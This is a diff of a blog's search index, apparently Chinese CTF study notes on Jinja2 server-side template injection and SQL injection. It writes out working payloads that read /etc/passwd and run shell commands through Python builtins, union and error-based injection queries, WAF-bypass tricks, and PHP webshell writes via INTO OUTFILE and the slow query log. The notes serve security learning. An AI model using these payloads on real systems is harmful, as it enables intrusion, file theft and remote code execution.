-<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a><strong>基础payload</strong></h4><pre><code class="highlight plaintext">获得基类
+<h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h4><pre><code class="highlight jinja2">
+&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句
+ 
+&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出
+ 
+&#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释
+ 
+#...# for Line Statements #有和&#123;%%&#125;相同的效果</code></pre>
+
+
+
+<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a><strong>基础payload</strong></h4><pre><code class="highlight jinja2">常用入口：
+1) 基类当入口
+2)config #获取配置信息
+3)lipsum
+&#123;&#123; lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read() &#125;&#125;
+
+4)request
+&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
+&#123;&#123;request.application.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read()&#125;&#125;
+
+5)url_for
+&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
+
+6)get_flashed 
+&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
+
+
+调用命令:
+1)popen
+2)__builtins__ 调用方法</code></pre>
+
+
+
+<pre><code class="highlight plaintext">获得基类
 #python2.7
 &#x27;&#x27;.__class__.__mro__[2]
 &#123;&#125;.__class__.__bases__[0]
@@ -1165,7 +1199,7 @@ request.__class__.__mro__[1]
 [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
 [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
 [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
-
+  
 #python3.7
 #命令执行
 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
@@ -1209,7 +1243,8 @@ Cookie:arg1=open;arg2=/etc/passwd
 post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 
 <p><strong>过滤下划线</strong></p>
-<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre>
+<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
+//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>
 
 <p><strong>过滤花括号</strong></p>
 <pre><code class="highlight plaintext">#用&#123;%%&#125;标记
@@ -1326,175 +1361,6 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 ]]></content>
       <tags>
         <tag>-CTF -Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>从零开始的SQL注入生活</title>
-    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
-    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
-<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
-<li><strong>创建</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
-<span class="keyword">create</span> <span class="keyword">table</span> table_name(
-column1 datatype,
-.......
-);#建立一个表
-</code></pre>
-
-
-
-<ul>
-<li><strong>查询</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
-<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
-<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
-<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
-<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
-#条件查询<span class="keyword">Where</span>
-(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
-(<span class="number">8</span>)<span class="keyword">NOT</span>
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
-
-<ul>
-<li><strong>插入</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
-<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
-<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
-
-<ul>
-<li><strong>注马</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
-<span class="number">2.</span>利用日志文件写入木马
-<span class="number">1.</span>开启日志功能
-
-<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
-<span class="number">2.</span>设置日志存储路径
-
-<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
-<span class="number">3.</span>执行<span class="keyword">sql</span>语句
-
-<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
-</code></pre>
-
-
-
-<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><ul>
-<li>union注入(-1’)</li>
-</ul>
-<p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
-<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
-<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
-#查完后使用<span class="keyword">select</span> 语句
-<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
-#查库名
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
-#查表名
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
-#查列名
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
-#直接查数据
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#</code></pre>
-
-<ul>
-<li>报错注入</li>
-</ul>
-<p>1.extractvalue函数</p>
-<p>查询对象xml某一个标签的值</p>
-<p>如果查询的标签格式不对，就会报错</p>
-<p>利用concat函数来链接两个字符串</p>
-<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
-<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
-
-<p>-&gt;查询div，~存在会报错</p>
-<p>爆出~database（）</p>
-<p>2.updatexml</p>
-<p>更新xml文档内容</p>
-<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
-<p>同样道理，当没有对应路径的时候会报错</p>
-<p>‘ and updatexml(‘div’, concat(‘~’,database()),’hi’)#</p>
-<p>其他同上</p>
-<ul>
-<li>堆叠注入</li>
-</ul>
-<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
-<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
-1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
-设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
-</code></pre>
-
-
-
-<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><h2 id="Episode-4-你好，绕WAF"><a href="#Episode-4-你好，绕WAF" class="headerlink" title="Episode   4  你好，绕WAF"></a>Episode   4  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
-<p>然后可以使用<code>anandd</code>绕过</p>
-<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
-<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
-
-<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
-<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
-<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
-<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
-<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
-<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
-#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
-<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
-#
-<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
-<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
-limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
-#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
-<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
-
-<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
-<p>最常见的一个盲注的sql语句：</p>
-<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
-
-<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
-<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
-<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
-
-<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
-<p>常用注释符：</p>
-<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
-<p>用法：</p>
-<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
-<p>2）使用大小写绕过：</p>
-<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
-<p>3）内联注释绕过：</p>
-<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
-<p>4） 双关键字绕过：</p>
-<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
-<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
-<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
-<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
-<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
-<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
-<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
-<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
-<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
-<h2 id="Episode-5-模糊匹配"><a href="#Episode-5-模糊匹配" class="headerlink" title="Episode 5  模糊匹配"></a>Episode 5  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
-<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
-<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
-<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
-<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
-<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
-<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
-<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
-<h2 id="奇奇怪怪的知识点积累"><a href="#奇奇怪怪的知识点积累" class="headerlink" title="奇奇怪怪的知识点积累"></a>奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
-<p>|| 逻辑或的短路：a||b</p>
-<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
-<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
-]]></content>
-      <tags>
-        <tag>-web -CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1617,6 +1483,272 @@ if __name__ == &quot;__main__&quot;:
 ]]></content>
       <tags>
         <tag>-CTF -Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从零开始的SQL注入生活</title>
+    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
+    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
+<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
+<li><strong>创建</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
+<span class="keyword">create</span> <span class="keyword">table</span> table_name(
+column1 datatype,
+.......
+);#建立一个表
+</code></pre>
+
+
+
+<ul>
+<li><strong>查询</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
+<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
+<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
+group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
+<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
+#条件查询<span class="keyword">Where</span>
+(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
+(<span class="number">8</span>)<span class="keyword">NOT</span>
+<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
+
+<ul>
+<li><strong>插入</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
+<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
+<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
+
+<ul>
+<li><strong>注马</strong></li>
+</ul>
+<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
+<span class="number">2.</span>利用日志文件写入木马
+<span class="number">1.</span>开启日志功能
+
+<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
+<span class="number">2.</span>设置日志存储路径
+
+<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
+<span class="number">3.</span>执行<span class="keyword">sql</span>语句
+
+<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
+</code></pre>
+
+
+
+<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><h3 id="union注入-1’"><a href="#union注入-1’" class="headerlink" title="union注入(-1’)"></a>union注入(-1’)</h3><p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
+<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
+<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
+#查完后使用<span class="keyword">select</span> 语句
+<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
+#查库名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
+#查表名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
+#查列名
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
+#直接查数据
+<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#
+
+#其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.extractvalue函数</p>
+<p>查询对象xml某一个标签的值</p>
+<p>如果查询的标签格式不对，就会报错</p>
+<p>利用concat函数来链接两个字符串</p>
+<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
+<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
+
+<p>-&gt;查询div，~存在会报错</p>
+<p>爆出~database（）</p>
+<p>2.updatexml</p>
+<p>更新xml文档内容</p>
+<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
+<p>同样道理，当没有对应路径的时候会报错</p>
+<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
+&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
+</code></pre>
+
+<p>其他同上</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
+1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
+设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
+</code></pre>
+
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p>
+<pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre>
+
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p>
+<p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p>
+<h4 id="常用过滤函数"><a href="#常用过滤函数" class="headerlink" title="常用过滤函数"></a><strong>常用过滤函数</strong></h4><p><strong>trim()函数</strong><br>移除字符串两侧的空白字符或其他预定义字符<br><strong>htmlspecialchars()函数</strong><br>把预定义的字符”&lt;”和”&gt;”转换为HTML实体，预防XSS<br><strong>addslashes()函数</strong><br>返回在预定义字符之前添加反斜杠的字符串</p>
+<pre><code class="highlight sql"># 预定义字符
+<span class="number">1.</span>单引号(<span class="string">&#x27;)</span>
+<span class="string">2.双引号(&quot;)</span>
+<span class="string">3.反斜杠(\)</span>
+<span class="string">4.NULL</span></code></pre>
+
+<p>上述函数常在CMS里使用进行过滤</p>
